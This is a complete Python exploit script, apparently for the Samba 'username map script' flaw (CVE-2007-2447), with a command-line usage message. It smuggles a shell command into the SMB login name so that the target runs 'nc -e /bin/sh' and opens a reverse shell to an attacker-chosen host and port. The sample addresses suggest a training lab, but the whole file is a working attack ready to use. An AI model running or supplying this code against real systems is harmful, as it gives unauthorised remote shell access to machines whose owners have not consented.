#!/usr/bin/env python3
from smb.SMBConnection import SMBConnection
import sys


def exploit(rhost, lhost, lport):
    payload = f"nc -nv {lhost} {lport} -e /bin/sh"
    login = f"/=`nohup {payload}`"
    conn = SMBConnection(login, "", "", "")
    assert conn.connect(rhost, 139, timeout=3)


if len(sys.argv) != 4:
    print("Usage: ./2447.py [RHOST] [LHOST] [LPORT]\n")
    print("Example: ./2447.py 10.10.10.3 10.10.14.38 9001\n")
    sys.exit(1)
else:
    exploit(sys.argv[1], sys.argv[2], sys.argv[3])
